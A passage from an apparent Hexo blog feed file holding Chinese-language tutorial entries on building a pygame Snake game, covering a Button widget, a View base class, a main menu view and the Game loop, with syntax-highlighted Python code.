pygame.display.set_mode(</span><br><span class="line">            (self.w*self.BLOCK_SIZE[<span class="number">0</span>], self.h * self.BLOCK_SIZE[<span class="number">1</span>]), <span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">        <span class="comment"># 初始化蛇</span></span><br><span class="line">        self.snake = Snake(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">    在某个位置绘制一个块</span></span><br><span class="line"><span class="string">    """</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_surface</span><span class="params">(self, pos, surface)</span>:</span></span><br><span class="line">        self.screen.blit(</span><br><span class="line">            surface, (pos[<span class="number">0</span>]*self.BLOCK_SIZE[<span class="number">0</span>], pos[<span class="number">1</span>]*self.BLOCK_SIZE[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.snake.on_draw(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> event.type == KEYDOWN:</span><br><span class="line">            self.snake.on_event(event)</span><br></pre></td></tr></table></figure><p>运行后可以发现蛇在移动，通过上下左右控制蛇身以及方向</p><p><img src="0.png" alt=""></p><p>程序代码：<a href="https://github.com/DXkite/python-snake-game-demo/tree/master/08-snake-draw-and-move" target="_blank" rel="noopener">https://github.com/DXkite/python-snake-game-demo/tree/master/08-snake-draw-and-move</a></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>07 贪吃蛇 - 界面切换与控制</title>
      <link href="/2018/07/11/snake-frame/"/>
      <url>/2018/07/11/snake-frame/</url>
      <content type="html"><![CDATA[<p>上一节我们创建了一个按钮，现在我们要把按钮利用起来，现在我们需要三个界面：</p><ol><li>游戏主界面：提供游戏的开始和退出</li><li>游戏界面：显示贪吃蛇以及游戏</li><li>游戏失败界面：贪吃蛇死亡后显示的界面<a id="more"></a></li></ol><p>回想一下界面的整个流程，现在我们需要开始正式写了，我们需要一个主程序，来控制各种界面的切换，以及需要三个界面，控制界面的显示等事务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span>:</span></span><br><span class="line">    screen = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    界面初始化</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, screen)</span>:</span></span><br><span class="line">        self.screen = screen</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    界面绘制处理</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    界面事件分发</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>一个界面至少要包含两个方法，用来处理绘制和事件，现在我们来写第一个界面，这个界面为主界面，用来显示开始游戏和退出按键，以及显示一个游戏大图, 实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainView</span><span class="params">(View)</span>:</span></span><br><span class="line"></span><br><span class="line">    logo = <span class="keyword">None</span></span><br><span class="line">    btn_start = <span class="keyword">None</span></span><br><span class="line">    btn_exit = <span class="keyword">None</span></span><br><span class="line">    context = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, context)</span>:</span></span><br><span class="line">        self.btn_start = Button(<span class="string">'Start Game'</span>, self._on_start)</span><br><span class="line">        self.btn_exit = Button(<span class="string">'Exit Game'</span>, self._on_exit)</span><br><span class="line">        self.context = context</span><br><span class="line">        self.logo = pygame.image.load(<span class="string">'img/logo.png'</span>)</span><br><span class="line">        w, h = self.logo.get_size()</span><br><span class="line">        <span class="comment"># 调整界面适应 Logo 大小以及显示按钮</span></span><br><span class="line">        self.context.screen = pygame.display.set_mode(</span><br><span class="line">            (int(w * <span class="number">1.5</span>), int(h * <span class="number">2</span>)), <span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">        <span class="comment"># 设置界面标题</span></span><br><span class="line">        pygame.display.set_caption(<span class="string">'Python Snake Game v1.0'</span>)</span><br><span class="line">        View.__init__(self, context.screen)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 绘制界面</span></span><br><span class="line">        self._on_draw()</span><br><span class="line">        <span class="comment"># 绘制按钮</span></span><br><span class="line">        self.btn_start.on_draw(self.context.screen)</span><br><span class="line">        self.btn_exit.on_draw(self.context.screen)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="comment"># 监控各种事件</span></span><br><span class="line">        self.btn_start.on_event(event)</span><br><span class="line">        self.btn_exit.on_event(event)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_on_exit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 控制退出状态</span></span><br><span class="line">        print(<span class="string">'exit game'</span>)</span><br><span class="line">        self.context.running = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_on_start</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 切换界面到游戏界面</span></span><br><span class="line">        print(<span class="string">'start game'</span>)</span><br><span class="line">        self.context.view = GameView(self.context)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_on_draw</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        计算各个按钮的位置以及Logo的位置</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        s_w, s_h = self.context.screen.get_size()</span><br><span class="line">        l_w, l_h = self.logo.get_size()</span><br><span class="line">        x, y, bs_w, bs_h = self.btn_start.get_box()</span><br><span class="line">        x, y, be_w, be_h = self.btn_exit.get_box()</span><br><span class="line">        y_start = l_h + <span class="number">50</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        界面元素排版</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        self.btn_start.pos = (s_w/<span class="number">2</span> - bs_w / <span class="number">2</span>, y_start)</span><br><span class="line">        self.btn_exit.pos = (s_w/<span class="number">2</span> - be_w / <span class="number">2</span>, y_start + bs_h + <span class="number">4</span>)</span><br><span class="line">        self.context.screen.blit(self.logo, (s_w/<span class="number">2</span>-l_w/<span class="number">2</span>, s_h/<span class="number">2</span>-l_h/<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>为了使界面能够正常显示，我们添加一个 <code>Game</code> 类来控制游戏以及界面的显示，控制界面的显示与操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> QUIT</span><br><span class="line"><span class="keyword">from</span> pygameui <span class="keyword">import</span> Button</span><br><span class="line"><span class="keyword">from</span> views <span class="keyword">import</span> MainView</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="comment"># 运行状态</span></span><br><span class="line">    running = <span class="keyword">True</span></span><br><span class="line">    GAME_START = <span class="number">0</span></span><br><span class="line">    GAME_OVER = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 屏幕状态</span></span><br><span class="line">    screen = <span class="keyword">None</span></span><br><span class="line">    <span class="comment"># 显示界面</span></span><br><span class="line">    view = <span class="keyword">None</span></span><br><span class="line">    <span class="comment"># 运行时钟</span></span><br><span class="line">    clock = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        pygame.init()</span><br><span class="line">        <span class="comment"># 初始化基础界面</span></span><br><span class="line">        self.clock = pygame.time.Clock()</span><br><span class="line">        self.screen = pygame.display.set_mode((<span class="number">300</span>, <span class="number">150</span>), <span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">        self.view = MainView(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> self.running:</span><br><span class="line">            <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">                <span class="comment"># 分发界面事件</span></span><br><span class="line">                self.view.on_event(event)</span><br><span class="line">                <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">                    self.running = <span class="keyword">False</span></span><br><span class="line">            self.screen.fill((<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>))</span><br><span class="line">            <span class="comment"># 调用界面显示</span></span><br><span class="line">            self.view.on_draw()</span><br><span class="line">            pygame.display.flip()</span><br><span class="line">            self.clock.tick(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Game().run()</span><br></pre></td></tr></table></figure><p>全部代码： <a href="https://github.com/DXkite/python-snake-game-demo/tree/master/07-snake-frame" target="_blank" rel="noopener">https://github.com/DXkite/python-snake-game-demo/tree/master/07-snake-frame</a></p><p><em>运行界面</em></p><p><img src="0.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>06 贪吃蛇 - 按钮控件实现</title>
      <link href="/2018/07/10/snake-ui-button/"/>
      <url>/2018/07/10/snake-ui-button/</url>
      <content type="html"><![CDATA[<p>为了实现游戏中部分控制的操作，现在我们现在自定义一个按钮控件，功能也不多，定位采用绝对定位，鼠标点击之后就调用回调函数，并有个按下效果。</p><a id="more"></a><p>按钮的UI采用文字，或者其他自定义的表面都可，基本框架代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Button 控件</span></span><br><span class="line"><span class="string">-----------</span></span><br><span class="line"><span class="string">为pygame 绘制一个button</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span>:</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line">    click = <span class="keyword">None</span></span><br><span class="line">    surface_normal = <span class="keyword">None</span></span><br><span class="line">    surface_hover = <span class="keyword">None</span></span><br><span class="line">    surface_clicked = <span class="keyword">None</span></span><br><span class="line">    text = <span class="string">'Button'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, text, callable)</span>:</span></span><br><span class="line">        self.click = callable</span><br><span class="line">        self.text = text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    绘制按钮</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self, screen)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    监控事件</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>一个按钮在运行中会监控鼠标按下事件，当鼠标移动到按钮上面的时候会显示 <code>surface_hover</code> ，正常状况下显示为 <code>surface_normal</code> ，当鼠标按下时显示 <code>surface_click</code> ，按下之后调用回调函数 <code>click</code>，这就是整个按钮的功能</p><h2 id="生成显示区域"><a href="#生成显示区域" class="headerlink" title="生成显示区域"></a>生成显示区域</h2><p>为了区分状态，这里我们生成三个表面来控制显示UI，并监控三种状态，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> MOUSEBUTTONDOWN, MOUSEBUTTONUP, MOUSEMOTION</span><br><span class="line"></span><br><span class="line">pygame.init()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Button 控件</span></span><br><span class="line"><span class="string">-----------</span></span><br><span class="line"><span class="string">为pygame 绘制一个button</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span>:</span></span><br><span class="line">    NORMAL = <span class="number">0</span></span><br><span class="line">    CLICKED = <span class="number">1</span></span><br><span class="line">    HOVER = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    pos = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line">    click = <span class="keyword">None</span></span><br><span class="line">    surface_normal = <span class="keyword">None</span></span><br><span class="line">    surface_hover = <span class="keyword">None</span></span><br><span class="line">    surface_clicked = <span class="keyword">None</span></span><br><span class="line">    status = NORMAL</span><br><span class="line">    text = <span class="string">'Button'</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, text, callable)</span>:</span></span><br><span class="line">        self.click = callable</span><br><span class="line">        self.text = text</span><br><span class="line">        self._gen_surface()</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    绘制按钮</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_draw</span><span class="params">(self, screen)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.status == Button.HOVER:</span><br><span class="line">            screen.blit(self.surface_hover, self.pos)</span><br><span class="line">        <span class="keyword">elif</span> self.status ==  Button.CLICKED:</span><br><span class="line">            screen.blit(self.surface_clicked, self.pos)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screen.blit(self.surface_normal, self.pos)</span><br><span class="line"></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    监控事件</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> event.type == MOUSEBUTTONDOWN:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> event.type == MOUSEBUTTONUP:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> event.type == MOUSEMOTION:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_gen_surface</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.surface_normal = self.font.render(self.text, <span class="keyword">True</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        self.surface_hover = self.font.render(self.text, <span class="keyword">True</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">                                              (<span class="number">0xee</span>, <span class="number">0xee</span>, <span class="number">0xee</span>))</span><br><span class="line">        self.surface_clicked = self.font.render(self.text, <span class="keyword">True</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">                                                (<span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>))</span><br></pre></td></tr></table></figure><h3 id="监控鼠标事件"><a href="#监控鼠标事件" class="headerlink" title="监控鼠标事件"></a>监控鼠标事件</h3><p>按钮绘制好了之后，我们需要检测鼠标状态来控制按钮显示的位置以及调用回调按下事件的回调函数，既判断按钮所在区域<br>判断点是否在矩形内：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_in_button_box</span><span class="params">(self, point, box)</span>:</span></span><br><span class="line">    p_x, p_y = point</span><br><span class="line">    x, y, w, h = box</span><br><span class="line">    <span class="keyword">if</span> p_x &gt;= x <span class="keyword">and</span> p_x &lt;= x + w:</span><br><span class="line">        <span class="keyword">if</span> p_y &gt;= y <span class="keyword">and</span> p_y &lt;= y + h:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><p>控制按键显示以及回调：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_event</span><span class="params">(self, event)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> event.type == MOUSEBUTTONDOWN:</span><br><span class="line">        <span class="keyword">if</span> self._in_button_box(event.pos, self.box):</span><br><span class="line">            self.status = self.CLICKED</span><br><span class="line">            self.click()</span><br><span class="line">    <span class="keyword">elif</span> event.type == MOUSEMOTION:</span><br><span class="line">        <span class="keyword">if</span> self._in_button_box(event.pos, self.box):</span><br><span class="line">            self.status = self.HOVER</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.status = self.NORMAL</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.status = self.NORMAL</span><br></pre></td></tr></table></figure><p><em>运行测试</em></p><p><img src="0.gif" alt="运行测试"></p><p>全部代码</p><blockquote><p>main.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> QUIT</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pygameui <span class="keyword">import</span> Button</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">300</span>, <span class="number">150</span>), <span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">text = <span class="string">'Play music with any keydown'</span></span><br><span class="line"></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">初始化音频播放器</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">pygame.mixer.init()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_test</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'button clicked'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">button = Button(text=<span class="string">'Exit'</span>, callable=click_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        button.on_event(event)</span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>))</span><br><span class="line">    button.on_draw(screen)</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip()</span><br><span class="line">    clock.tick(<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><blockquote><p>pygameui.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> 